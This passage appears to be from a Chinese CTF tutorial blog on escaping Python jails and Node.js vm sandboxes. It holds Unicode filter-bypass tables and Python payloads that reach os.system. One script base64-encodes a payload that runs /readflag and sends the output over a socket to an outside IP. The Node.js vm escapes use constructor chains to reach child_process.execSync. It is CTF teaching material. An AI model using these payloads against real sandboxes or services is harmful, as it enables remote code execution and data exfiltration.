&#x27;ⅈ&#x27;, &#x27;ⅰ&#x27;, &#x27;ⓘ&#x27;, &#x27;ｉ&#x27;, &#x27;𝐢&#x27;, &#x27;𝑖&#x27;]</span><br><span class="line">j [&#x27;j&#x27;, &#x27;ʲ&#x27;, &#x27;ⅉ&#x27;, &#x27;ⓙ&#x27;, &#x27;ⱼ&#x27;, &#x27;ｊ&#x27;, &#x27;𝐣&#x27;, &#x27;𝑗&#x27;, &#x27;𝒋&#x27;, &#x27;𝒿&#x27;]</span><br><span class="line">k [&#x27;k&#x27;, &#x27;ᵏ&#x27;, &#x27;ₖ&#x27;, &#x27;ⓚ&#x27;, &#x27;ｋ&#x27;, &#x27;𝐤&#x27;, &#x27;𝑘&#x27;, &#x27;𝒌&#x27;, &#x27;𝓀&#x27;, &#x27;𝓴&#x27;]</span><br><span class="line">l [&#x27;l&#x27;, &#x27;ˡ&#x27;, &#x27;ₗ&#x27;, &#x27;ℓ&#x27;, &#x27;ⅼ&#x27;, &#x27;ⓛ&#x27;, &#x27;ｌ&#x27;, &#x27;𝐥&#x27;, &#x27;𝑙&#x27;, &#x27;𝒍&#x27;]</span><br><span class="line">m [&#x27;m&#x27;, &#x27;ᵐ&#x27;, &#x27;ₘ&#x27;, &#x27;ⅿ&#x27;, &#x27;ⓜ&#x27;, &#x27;ｍ&#x27;, &#x27;𝐦&#x27;, &#x27;𝑚&#x27;, &#x27;𝒎&#x27;, &#x27;𝓂&#x27;]</span><br><span class="line">n [&#x27;n&#x27;, &#x27;ⁿ&#x27;, &#x27;ₙ&#x27;, &#x27;ⓝ&#x27;, &#x27;ｎ&#x27;, &#x27;𝐧&#x27;, &#x27;𝑛&#x27;, &#x27;𝒏&#x27;, &#x27;𝓃&#x27;, &#x27;𝓷&#x27;]</span><br><span class="line">o [&#x27;o&#x27;, &#x27;º&#x27;, &#x27;ᵒ&#x27;, &#x27;ₒ&#x27;, &#x27;ℴ&#x27;, &#x27;ⓞ&#x27;, &#x27;ｏ&#x27;, &#x27;𝐨&#x27;, &#x27;𝑜&#x27;, &#x27;𝒐&#x27;]</span><br><span class="line">p [&#x27;p&#x27;, &#x27;ᵖ&#x27;, &#x27;ₚ&#x27;, &#x27;ⓟ&#x27;, &#x27;ｐ&#x27;, &#x27;𝐩&#x27;, &#x27;𝑝&#x27;, &#x27;𝒑&#x27;, &#x27;𝓅&#x27;, &#x27;𝓹&#x27;]</span><br><span class="line">q [&#x27;q&#x27;, &#x27;ⓠ&#x27;, &#x27;ｑ&#x27;, &#x27;𝐪&#x27;, &#x27;𝑞&#x27;, &#x27;𝒒&#x27;, &#x27;𝓆&#x27;, &#x27;𝓺&#x27;, &#x27;𝔮&#x27;, &#x27;𝕢&#x27;]</span><br><span class="line">r [&#x27;r&#x27;, &#x27;ʳ&#x27;, &#x27;ᵣ&#x27;, &#x27;ⓡ&#x27;, &#x27;ｒ&#x27;, &#x27;𝐫&#x27;, &#x27;𝑟&#x27;, &#x27;𝒓&#x27;, &#x27;𝓇&#x27;, &#x27;𝓻&#x27;]</span><br><span class="line">s [&#x27;s&#x27;, &#x27;ſ&#x27;, &#x27;ˢ&#x27;, &#x27;ₛ&#x27;, &#x27;ⓢ&#x27;, &#x27;ｓ&#x27;, &#x27;𝐬&#x27;, &#x27;𝑠&#x27;, &#x27;𝒔&#x27;, &#x27;𝓈&#x27;]</span><br><span class="line">t [&#x27;t&#x27;, &#x27;ᵗ&#x27;, &#x27;ₜ&#x27;, &#x27;ⓣ&#x27;, &#x27;ｔ&#x27;, &#x27;𝐭&#x27;, &#x27;𝑡&#x27;, &#x27;𝒕&#x27;, &#x27;𝓉&#x27;, &#x27;𝓽&#x27;]</span><br><span class="line">u [&#x27;u&#x27;, &#x27;ᵘ&#x27;, &#x27;ᵤ&#x27;, &#x27;ⓤ&#x27;, &#x27;ｕ&#x27;, &#x27;𝐮&#x27;, &#x27;𝑢&#x27;, &#x27;𝒖&#x27;, &#x27;𝓊&#x27;, &#x27;𝓾&#x27;]</span><br><span class="line">v [&#x27;v&#x27;, &#x27;ᵛ&#x27;, &#x27;ᵥ&#x27;, &#x27;ⅴ&#x27;, &#x27;ⓥ&#x27;, &#x27;ｖ&#x27;, &#x27;𝐯&#x27;, &#x27;𝑣&#x27;, &#x27;𝒗&#x27;, &#x27;𝓋&#x27;]</span><br><span class="line">w [&#x27;w&#x27;, &#x27;ʷ&#x27;, &#x27;ⓦ&#x27;, &#x27;ｗ&#x27;, &#x27;𝐰&#x27;, &#x27;𝑤&#x27;, &#x27;𝒘&#x27;, &#x27;𝓌&#x27;, &#x27;𝔀&#x27;, &#x27;𝔴&#x27;]</span><br><span class="line">x [&#x27;x&#x27;, &#x27;ˣ&#x27;, &#x27;ₓ&#x27;, &#x27;ⅹ&#x27;, &#x27;ⓧ&#x27;, &#x27;ｘ&#x27;, &#x27;𝐱&#x27;, &#x27;𝑥&#x27;, &#x27;𝒙&#x27;, &#x27;𝓍&#x27;]</span><br><span class="line">y [&#x27;y&#x27;, &#x27;ʸ&#x27;, &#x27;ⓨ&#x27;, &#x27;ｙ&#x27;, &#x27;𝐲&#x27;, &#x27;𝑦&#x27;, &#x27;𝒚&#x27;, &#x27;𝓎&#x27;, &#x27;𝔂&#x27;, &#x27;𝔶&#x27;]</span><br><span class="line">z [&#x27;z&#x27;, &#x27;ᶻ&#x27;, &#x27;ⓩ&#x27;, &#x27;ｚ&#x27;, &#x27;𝐳&#x27;, &#x27;𝑧&#x27;, &#x27;𝒛&#x27;, &#x27;𝓏&#x27;, &#x27;𝔃&#x27;, &#x27;𝔷&#x27;]</span><br></pre></td></tr></table></figure>

<p>一些其他的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)).read()</span><br><span class="line"><span class="comment">#先输入eval(input())绕过字数限制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)).read())</span><br><span class="line"><span class="comment">#使用Unicode字符绕过过滤</span></span><br><span class="line">ᵉval(inpᵘt())</span><br><span class="line"><span class="comment">#使用breakpoint()函数下断点进入Pdb，然后再输入命令</span></span><br><span class="line"><span class="comment">#输入help()</span></span><br><span class="line"><span class="comment">#再输入sys</span></span><br><span class="line"><span class="comment">#然后输入!cat flag获取flag</span></span><br><span class="line"><span class="comment">#在help()中可以输入__main__或者__dict__查看是否有信息泄露</span></span><br><span class="line"><span class="comment">#使用bytes([]).decode()来绕过chr的decode</span></span><br><span class="line"><span class="built_in">open</span>((<span class="built_in">bytes</span>([<span class="number">102</span>])+<span class="built_in">bytes</span>([<span class="number">108</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">103</span>])).decode()).read()</span><br><span class="line"><span class="comment">#获取object的子类列表中倒数第四个子类的__init__方法的全局变量中名为&#x27;system&#x27;的对象</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">bytes</span>([<span class="number">115</span>])+<span class="built_in">bytes</span>([<span class="number">121</span>])+<span class="built_in">bytes</span>([<span class="number">115</span>])+<span class="built_in">bytes</span>([<span class="number">116</span>])+<span class="built_in">bytes</span>([<span class="number">101</span>])+<span class="built_in">bytes</span>([<span class="number">109</span>])).decode()]((<span class="built_in">bytes</span>([<span class="number">99</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">116</span>])+<span class="built_in">bytes</span>([<span class="number">32</span>])+<span class="built_in">bytes</span>([<span class="number">102</span>])+<span class="built_in">bytes</span>([<span class="number">108</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">103</span>])).decode())</span><br><span class="line"><span class="comment">#如果过滤了bytes，可以用type(str(1).encode())绕过</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">121</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">101</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">109</span>])).decode()]((<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">108</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])).decode())</span><br><span class="line"><span class="comment">#system(&#x27;ls&#x27;)</span></span><br><span class="line">一些方法的<span class="built_in">type</span>构造</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">list</span> = <span class="built_in">type</span>(<span class="built_in">type</span>(flag).mro())(flag)</span><br><span class="line"><span class="built_in">bytes</span> = <span class="built_in">type</span>(flag.encode())</span><br><span class="line"><span class="built_in">bool</span> = <span class="built_in">type</span>(flag.istitle())</span><br><span class="line"><span class="built_in">int</span> = <span class="built_in">type</span>(flag.find(flag))</span><br><span class="line"><span class="built_in">tuple</span> = <span class="built_in">type</span>(flag.partition(flag))</span><br><span class="line"><span class="comment">#如果+被过滤，可以使用.__add__(xxx)来绕过</span></span><br><span class="line"><span class="comment">#自动生成Payload的脚本:</span></span><br><span class="line">command = <span class="string">&quot;cat flag_y0u_CaNt_FiNd_mE&quot;</span></span><br><span class="line">mylist = []</span><br><span class="line">system = <span class="string">&quot;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(system,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> command:</span><br><span class="line">    mylist.append(<span class="string">f&quot;type(str(1).encode())([<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>])&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&quot;</span>+mylist.pop(<span class="number">0</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 删除并打印出列表的第一个元素</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> mylist:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;.__add__(<span class="subst">&#123;item&#125;</span>)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#type被过滤了可以使用list(dict(system=114514))[0]获取system这个字符串</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">list</span>(<span class="built_in">dict</span>(system=<span class="number">1</span>))[<span class="number">0</span>]](<span class="built_in">list</span>(<span class="built_in">dict</span>(sh=<span class="number">1</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#可以使用dir()函数查看类中的方法和变量名</span></span><br><span class="line"><span class="comment">#如果有encode方法就可以读取flag</span></span><br><span class="line">&gt; my_flag.flag_level5.encode()</span><br><span class="line"><span class="comment">#可以输入globals()函数查看全局变量中是否有信息泄露</span></span><br><span class="line"><span class="comment">#可以输入vars()函数查看全局变量中是否有信息泄露</span></span><br><span class="line"><span class="comment">#利用__import__()函数动态导入模块</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>).__stdout__.write(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).read(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).O_RDONLY), <span class="number">0x114</span>).decode())</span><br><span class="line"><span class="comment">#__import__(&quot;sys&quot;).__stdout__.write()从sys模块中获取stdout并调用write方法讲内容输出到控制台</span></span><br><span class="line"><span class="comment">#__import__(&quot;os&quot;).read()从os模块中调用read方法去读取文件内容，读取文件的前0x114(276)个字节</span></span><br><span class="line"><span class="comment">#__import__(&quot;os&quot;).open()从os模块中调用open方法打开一个名为flag 的文件，并设置为只读模式</span></span><br><span class="line"><span class="comment">#利用lambda匿名函数来读取flag</span></span><br><span class="line">(<span class="keyword">lambda</span>:os.system(<span class="string">&#x27;cat flag&#x27;</span>))()</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>祖传脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h2 id="2-vm沙箱逃逸"><a href="#2-vm沙箱逃逸" class="headerlink" title="2.vm沙箱逃逸"></a>2.vm沙箱逃逸</h2><h3 id="0-介绍"><a href="#0-介绍" class="headerlink" title="0.介绍"></a>0.介绍</h3><p>在代码里面，有的时候会直接调用eval等函数，对于这些函数，无法屏蔽上下文环境的攻击，但是nodejs提供了一个函数叫做vm函数，与eval&#x2F;Function 最大的区别就是可自定义上下文，也就是可以控制被执行代码的访问资源。vm创造了一个沙盒的环境。</p>
<h3 id="1-js的作用域"><a href="#1-js的作用域" class="headerlink" title="1.js的作用域"></a>1.js的作用域</h3><p>如果有两个包1.js和2.js两个包</p>
<p>在包1里面是不能直接调用包2的</p>
<p>但是可以通过好多方式，比如require取取出来</p>
<p>或者设置一个exports</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">20</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">age</span> = age</span><br></pre></td></tr></table></figure>

<p>或者global对象</p>
<blockquote>
<p>服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process</p>
</blockquote>
<h4 id="全局命名空间"><a href="#全局命名空间" class="headerlink" title="全局命名空间"></a>全局命名空间</h4><p>全局命名空间是指在JavaScript中，所有全局对象（如<code>window</code>、<code>globalThis</code>、<code>global</code>对象）都有一个共同的全局命名空间。在这个命名空间中，所有的全局变量、函数、类等都是可见的，无需使用<code>var</code>、<code>let</code>或<code>const</code>声明。</p>
<p>全局命名空间在JavaScript中是非常重要的，因为它提供了全局对象的访问和操作能力。例如，<code>window</code>对象包含了所有的全局属性，如<code>document</code>、<code>console</code>、<code>setTimeout</code>等。全局命名空间也是JavaScript模块系统的基础，它允许你使用<code>import</code>和<code>export</code>关键字来导入和导出模块中的对象和函数。</p>
<p>全局命名空间在虚拟机环境中也是类似的，它同样包含了所有的全局对象，如<code>globalThis</code>、<code>global</code>对象等。因此，在虚拟机环境中执行的代码可以访问到全局命名空间中的全局对象，并执行相应的操作。</p>
<p>这给我们逃逸提供了基础</p>
<h3 id="2-eval-Function与vm"><a href="#2-eval-Function与vm" class="headerlink" title="2.eval&#x2F;Function与vm"></a>2.eval&#x2F;Function与vm</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) </span><br><span class="line"><span class="keyword">var</span> command = <span class="string">&quot;var a=2&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span>(command); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) </span><br></pre></td></tr></table></figure>

<p> 这里可以使用eval，改变外面的变量的值</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231008211031684.png" alt="image-20231008211031684"></p>
<p>这里的eval函数在使用的时候，能直接影响上下文</p>
<p>如果我们建立一个沙箱环境</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line"><span class="keyword">var</span> context = &#123;&#125; </span><br><span class="line">vm.<span class="title function_">createContext</span>(context); </span><br><span class="line"><span class="keyword">var</span> cmd = <span class="string">&quot;x = 2&quot;</span>;</span><br><span class="line">vm.<span class="title function_">runInContext</span>(cmd, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231010194607272.png" alt="image-20231010194607272"></p>
<p>可以看到，使用vm之后，可以使用context自定义上下文对象，也就是建立了一个沙箱环境，沙箱内的环境对外面的函数没有任何的影响，只有将a添加到环境里面的时候，才能读取</p>
<p>只能读取设置环境，不能修改</p>
<h3 id="3-vm函数"><a href="#3-vm函数" class="headerlink" title="3.vm函数"></a>3.vm函数</h3><p>沙箱的本质是创建一个作用域，将接受的函数作为参数执行</p>
<p>以下是一些参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</span><br><span class="line"></span><br><span class="line">vm.createContext([sandbox])： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</span><br><span class="line"></span><br><span class="line">vm.runInContext(code, contextifiedSandbox[, options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</span><br><span class="line"></span><br><span class="line">vm.runInNewContext(code[, sandbox][, options]): creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</span><br><span class="line"></span><br><span class="line">vm.Script类 vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</span><br><span class="line"></span><br><span class="line">new vm.Script(code, options)：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</span><br><span class="line"></span><br><span class="line">code：要被解析的JavaScript代码</span><br></pre></td></tr></table></figure>

<h3 id="4-开始逃逸"><a href="#4-开始逃逸" class="headerlink" title="4.开始逃逸"></a>4.开始逃逸</h3><blockquote>
<p>vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</p>
</blockquote>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> abc=&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>,abc);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure>

<p>这里使用runInNewContext建立了一个沙箱，但是我们通过<code>this.constructor.constructor(&#39;return process&#39;)()</code>在虚拟机环境中创建了一个全局对象，该对象具有对全局命名空间的引用。然后，代码使用<code>y1.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;)</code>来执行<code>child_process.execSync(&#39;calc&#39;)</code>。这里就已经逃逸出了vm沙箱</p>
<p>这里通过<code>this.constructor.constructor(&#39;return process&#39;)()</code>来向上寻找父类，将自己构造成了process类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this.constructor是object</span><br><span class="line">object.function是function</span><br></pre></td></tr></table></figure>

<h3 id="5-限制原型链子是null"><a href="#5-限制原型链子是null" class="headerlink" title="5.限制原型链子是null"></a>5.限制原型链子是null</h3><p>原来那样逃逸就寄了</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231010220953895.png" alt="image-20231010220953895"></p>
<p>原因简单，尝试寻找父类的时候寄了</p>
<p>由于 JS 里所有对象的原型链都会指向 Object.prototype，且 Object.prototype 和 Function 之间是相互指向的，所有对象通过原型链都能拿到 Function</p>
<h4 id="成员类执行"><a href="#成员类执行" class="headerlink" title="成员类执行"></a>成员类执行</h4><p>这样是可以执行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> abc=<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">abc.<span class="property">data</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.data.constructor.constructor(&#x27;return process&#x27;)()`</span>,abc);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure>

<p>可以执行</p>
<p>这里虽然限制了环境是Object.create(null);，如果直接使用constructor获得他的构造器，会返回一个空值</p>
<p>但是我们对他的成员类去返还构造器，就能得到object，从而完成逃逸</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231012092952410.png" alt="image-20231012092952410"></p>
<h4 id="tostring重写"><a href="#tostring重写" class="headerlink" title="tostring重写"></a>tostring重写</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure>

